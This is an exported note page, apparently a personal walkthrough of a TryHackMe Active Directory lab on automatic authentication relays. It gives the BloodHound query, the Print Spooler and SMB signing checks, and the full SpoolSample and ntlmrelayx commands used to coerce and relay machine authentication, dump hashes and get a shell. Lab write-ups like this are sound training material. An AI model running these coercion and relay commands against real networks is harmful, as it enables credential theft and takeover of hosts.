<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Automatic Relays</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Automatic Relays</h1><br/><strong><h1>Exploiting Automatic Relays</h1></strong><br /><br /><br />In this task we will take a look at some automated relays. Authentication attempts are constantly flying across the network, and as shown in the Breaching AD room, if we are lucky, we can intercept some of these challenges to gain access. But what if we don&#39;t like to wait? What if we can coerce authentication to occur?<br /><br />Although we already have privileged access to THMSERVER1, we could be in a position where we did not have access to a constrained delegation exploit. This is another excellent attack that can be performed to gain privileged access to hosts. <br /><br /><strong><h3>Machine Accounts</h3></strong><br /><br />All Windows hosts have a machine account. Essentially, this is the user account associated with the machine. Unless someone tampered with the account of the host, the passwords of these accounts are uncrackable. By default, they are 120 characters (UTF16) long and are automatically rotated every 30 days.<br /><br />In AD, these machine accounts are used quite a bit in different services. Different domain controllers use their machine accounts to synchronise AD updates and changes. When you request a certificate on behalf of the host you are working on, the machine account of that host is used for authentication to the AD Certificate Service.<br /><br />There is an <strong>exceptional case</strong> in AD, where <strong>one machine </strong>has <strong>admin rights</strong> over <strong>another machine</strong>. Essentially in the AD configuration, administrative permissions over a host have been granted to another host. Again, this is expected functionality such as domain controllers or SQL clusters that must be synchronised. However, these instances provide a very interesting attack vector for coercing authentication.<br /><br />We first need to identify cases where a machine account has administrative access over another machine. We can use Bloodhound for this, but it means we will have to write some custom cypher queries. Click the &quot;Create Custom Query&quot; in the Analysis tab in Bloodhound:<br /><br />We need the Following Query:<br /><br /><strong>MATCH p=(c1:Computer)-[r1:MemberOf*1..]-&gt;(g:Group)-[r2:AdminTo]-&gt;(n:Computer) RETURN p</strong><br /><br /><img src="images/350-1.png" alt="images/350-1.png" /><br /><br /><br /><strong><h3>The Printer Bug</h3></strong><br /><br /><br />Seriously, when this was reported, Microsoft responded that this was a feature. The printer bug is a &quot;feature&quot; of the MS-RPRN protocol (PrintSystem Remote Protocol), which allows a domain user to remotely force a target host running the Print Spooler service to authenticate to an arbitrary IP address. There have been a few of these bugs in recent years: Spooler, PetitPotam, PrintNightmare. Microsoft claims that the only bug is that some of these did not require AD credentials at all, but this issue has been resolved through security patches.<br /><br />Therefore, to exploit this, apart from machine account administrative privileges, we also need to meet the following four conditions :<br /><br />    1. A valid set of AD account credentials.<br />    2. Network connectivity to the target&#39;s SMB service.<br />    3. The target host must be running the Print Spooler service.<br />    4. The hosts must not have SMB signing enforced.<br /><br />Condition 1 and 2 have been met already. The only two we need to ensure works are conditions 3 and 4. <br /><br /><br /><strong><span style="text-decoration:underline;">Checking Print Spooler Service:</span></strong><br /><br />Theoritically, the following should work. However, i got access denied when tried from THMWRK1 system with both<strong> normal user</strong> &amp; <strong>tier 2 admin user</strong>.<br /><br /><strong>GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc</strong><br /><br /><img src="images/350-2.png" alt="images/350-2.png" /><br /><br /><br />The output from the cmdlet verifies that the service is running. If we get an access denied error, <br />you could perhaps attempt the PowerShell command:<br /><br /><strong>Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc</strong><br /><br />However, Microsoft has been cracking down viewing these ports from the network&#39;s perspective. If both give you an error, you may just need to take a leap of faith. Thus, condition three has been met.<br /><br /><img src="images/350-3.png" alt="images/350-3.png" /><br /><br />I did not get sucess with both the commands. Lets assume print spooler is running &amp; proceed.<br /><br /><br /><strong><span style="text-decoration:underline;">Checking SMB signing:</span></strong><br /><br />In order to relay the coerced authentication attempt, SMB signing should not be enforced. It should be noted that there is a difference between SMB signing being allowed and SMB signing being enforced. Since some legacy systems do not support SMB signing, by default, the configuration of SMB is that signing is allowed but not enforced, meaning that it will only be used if supported. Since we will be hosting a malicious SMB server, we can ensure our server does not support signing, forcing the target not to sign the SMB authentication attempt.<br /><br />To verify that THMSERVER1 and THMSERVER2 do not have SMB signing enforced, we can use <strong>Nmap</strong> on our AttackBox (Using NSE - smb2-security-mode):<br /><br /><strong>nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc</strong><br /><br /><img src="images/350-4.png" alt="images/350-4.png" /><br /><br />Thus, we confirm SMB signing is not <strong>Enforced</strong>. All 4 Requirements were met. We proceed to the exploit.<br /><br /><br /><strong><h2>Exploiting Authentication Relays<br /></h2></strong><br />Note: This attack can be unstable. Abusing the Print Spooler service may cause it to crash, and a callback is not always guaranteed. For this reason, the previous task already provided you with the permissions required to continue. However, understanding authentication relays and how to force them is essential for AD exploitation. As such, the steps to perform such an attack are provided below. You can decide to give it a go, but a callback is not guaranteed. If it does not work, move on to the next task and perhaps explore this again at the end of your room journey.<br /><br />We will be using <strong>SpoolSample</strong> to exploit the authentication relay. It is a C# exploit but has already been compiled for you and stored in the C:\Tools\ directory on THMWRK1.  We will use Spoolsample.exe to coerce THMSERVER2 to authenticate to us on our AttackBox and then <strong>Impacket&#39;s ntlmrelayx.py</strong> to relay the authentication attempt THMSERVER1. Note that if you are using your own VM, you will need to make sure you have the updated version of Impacket that supports SMBv2.<br /><br />References::<br /><strong>https://github.com/leechristensen/SpoolSample</strong><br /><strong>https://github.com/SecureAuthCorp/impacket</strong><br /><br />The first step is to set up the NTLM relay. On our AttackBox, we can use the following:<br /><br />python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://&quot;THMSERVER1 IP&quot; -debug<br /><br />Our Case:<br /><strong>impacket-ntlmrelayx -smb2support -t smb://10.200.79.201 -c &#39;whoami /all&#39; -debug</strong><br /><br /><img src="images/350-5.png" alt="images/350-5.png" /><br /><br />If we specify the <strong>hostname</strong> of THMSERVER1 instead of the <strong>IP</strong>, the host could request that we use<strong> Kerberos authentication</strong> instead of <strong>NTLM</strong>. Hence we should specify the IP instead. With the relay listening, we can now coerce THMSERVER2 to authenticate to us. In an SSH terminal on THMWRK1, execute the following:<br /><br />C:\Tools\&gt;SpoolSample.exe THMSERVER2.za.tryhackme.loc &quot;Attacker IP&quot;<br /><br />Our Case:<br /><strong>.\SpoolSample.exe THMSERVER2.za.tryhackme.loc 10.50.78.95</strong><br /><br /><img src="images/350-6.png" alt="images/350-6.png" /><br /><br />If all goes well, you should have received an authentication attempt and a relay to THMSERVER1. <br /><br />Clipped Output of <strong>ntlmrelay</strong>:<br /><br /><img src="images/350-7.png" alt="images/350-7.png" /><br /><br />This output resembles what would happen if you used the <strong>-c &#39;whoami /all&#39;</strong> command. However by specifying <strong>no command</strong>, you should now have performed a <strong>hashdump</strong>. These credentials can now be used to get a shell on the host!</div>
</body>
</html>
